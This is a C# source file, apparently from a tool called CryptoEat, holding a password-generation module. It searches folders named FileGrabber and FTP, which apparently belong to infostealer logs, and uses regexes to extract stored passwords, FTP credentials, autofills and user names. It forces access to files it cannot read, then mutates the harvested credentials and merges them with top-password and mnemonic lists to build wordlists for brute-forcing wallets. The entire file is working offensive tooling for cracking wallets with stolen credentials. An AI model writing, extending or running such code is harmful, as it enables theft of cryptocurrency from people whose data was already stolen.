using System.Text.RegularExpressions;

namespace CryptoEat.Modules.Logs
{
    internal static partial class PassGen
    {
        internal static HashSet<string> PreviousPasswords = new();
        internal static HashSet<string> BruteTopList = new();
        internal static HashSet<string> Mnemos = new();
        internal static char[] Addictions = Array.Empty<char>();

        private static readonly Regex MailRegex = MailRegex1();
        private static readonly Regex PasswordExtractor = PasswordExtractor1();
        private static readonly Regex FtpRegex = FtpRegex1();

        private static HashSet<string> GetFileGrabber(string walletPath)
        {
            var result = new HashSet<string>();

            Helpers.SetTitle("Working... Searching for passwords in FileGrabber");
            var dirInfo = new DirectoryInfo(walletPath);
            for (var i = 0; i < 4; i++)
            {
                var grabberPath = Path.Combine(dirInfo.FullName, "FileGrabber");
                if (Directory.Exists(grabberPath))
                {
                    var files = FileSystem
                        .ScanDirectories(grabberPath, false)
                        .SelectMany(Directory.EnumerateFiles)
                        .Where(file => Path.GetExtension(file) == ".txt");

                    foreach (var file in files)
                    {
                        try
                        {
                            var fileContent = File.ReadAllText(file);
                            result.UnionWith(PasswordExtractor
                                .Matches(fileContent)
                                .Select(match => match.Groups[1].Value));
                        }
                        catch
                        {
                            FileAccessHelper.CheckAndGrantAccess(file);
                        }
                    }
                    break;
                }

                dirInfo = dirInfo.Parent ?? dirInfo;
            }

            return result;
        }

        private static HashSet<string> GetFtpPasswords(string walletPath)
        {
            var result = new HashSet<string>();

            Helpers.SetTitle("Working... Searching for passwords in FTP");
            var dirInfo = new DirectoryInfo(walletPath);
            for (var i = 0; i < 4; i++)
            {
                var ftpPath = Path.Combine(dirInfo.FullName, "FTP");
                if (Directory.Exists(ftpPath))
                {
                    var files = FileSystem
                        .ScanDirectories(ftpPath, false)
                        .SelectMany(Directory.EnumerateFiles)
                        .Where(file => Path.GetExtension(file) == ".txt");

                    foreach (var file in files)
                    {
                        try
                        {
                            var fileContent = File.ReadAllText(file);
                            result.UnionWith(FtpRegex
                                .Matches(fileContent)
                                .SelectMany(match => new[] 
                                { 
                                    match.Groups[1].Value, 
                                    match.Groups[2].Value 
                                }));
                        }
                        catch
                        {
                            FileAccessHelper.CheckAndGrantAccess(file);
                        }
                    }
                    break;
                }

                dirInfo = dirInfo.Parent ?? dirInfo;
            }

            Helpers.SetTitle();
            return result;
        }

        internal static void Combinations(LogsHelper logO, string walletPath, ref HashSet<string> result)
        {
            GC.Collect();

            var fgPasswords = GetFileGrabber(walletPath);
            var ftpPasswords = GetFtpPasswords(walletPath);

            result.UnionWith(logO.Passwords ?? Enumerable.Empty<string>());
            result.UnionWith(logO.AutoFills ?? Enumerable.Empty<string>());
            result.UnionWith(logO.Users ?? Enumerable.Empty<string>());
            result.UnionWith(fgPasswords);
            result.UnionWith(ftpPasswords);

            fgPasswords.Clear();
            ftpPasswords.Clear();

            result.RemoveWhere(x => x.Length < 6);
            Helpers.SetTitle($"Generating combinations [1/3] [{result.Count}]");

            var tempCopy = result.ToList();

            var added1 = Addictions.SelectMany(x => tempCopy.Select(y => x + y)).ToList();
            var added2 = Addictions.SelectMany(x => tempCopy.Select(y => y + x)).ToList();
            var added3 = Generic.Settings.StrongBrute 
                ? new List<string>() 
                : Addictions.SelectMany(x => tempCopy.Select(y => x + y + x)).ToList();

            result.UnionWith(added1);
            result.UnionWith(added2);
            result.UnionWith(added3);
            result.RemoveWhere(x => x.Length < 8);

            GC.Collect();
            Helpers.SetTitle($"Generating combinations [2/3] [{result.Count}]");

            if (!Generic.Settings.GpuBrute || result.Count > 10_000_000)
            {
                result.UnionWith(PreviousPasswords);
                result.UnionWith(BruteTopList);
                result.UnionWith(Mnemos);
                added1.Clear();
                added2.Clear();
                added3.Clear();
                return;
            }

            result.UnionWith(Generic.Settings.StrongBrute 
                ? Addictions.SelectMany(x => added1.Select(y => y + x)) 
                : added3);
            result.UnionWith(added1);
            result.RemoveWhere(x => x.Length < 8);

            var comb = CreateCombinations(result);
            result.UnionWith(comb);
            comb.Clear();

            GC.Collect();
            Helpers.SetTitle($"Generating combinations [3/3] [{result.Count}]");

            var comb3 = result.SelectMany(x => new[] { x.ToUpper(), x.ToLower() }).ToList();
            result.UnionWith(comb3);
            comb3.Clear();

            result.UnionWith(BruteTopList);
            result.UnionWith(PreviousPasswords);
            result.UnionWith(Mnemos);

            Helpers.SetTitle();

            added1.Clear();
            added2.Clear();
            added3.Clear();
        }

        private static HashSet<string> CreateCombinations(in IReadOnlyCollection<string> addedAll)
        {
            var result = new HashSet<string>();

            foreach (var x in addedAll)
            {
                if (x.Length < 8) continue;

                var modifiedChars = x.ToCharArray();

                if (char.IsLetter(modifiedChars[0]))
                {
                    modifiedChars[0] = char.IsUpper(modifiedChars[0]) 
                        ? char.ToLower(modifiedChars[0]) 
                        : char.ToUpper(modifiedChars[0]);
                    result.Add(new string(modifiedChars));
                }

                if (char.IsLetter(modifiedChars[^1]))
                {
                    modifiedChars[^1] = char.IsUpper(modifiedChars[^1]) 
                        ? char.ToLower(modifiedChars[^1]) 
                        : char.ToUpper(modifiedChars[^1]);
                    result.Add(new string(modifiedChars));
                }
            }

            return result;
        }

        [GeneratedRegex(@"(?:\bpass(?:word)?|\bsecret)\b[^\n]*?:\s*(\S+)", RegexOptions.IgnoreCase | RegexOptions.Compiled)]
        private static partial Regex PasswordExtractor1();

        [GeneratedRegex(@"Username: (.*)\s*Password: (.*)", RegexOptions.Compiled)]
        private static partial Regex FtpRegex1();

        [GeneratedRegex(@"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b", RegexOptions.Compiled)]
        private static partial Regex MailRegex1();
    }
}
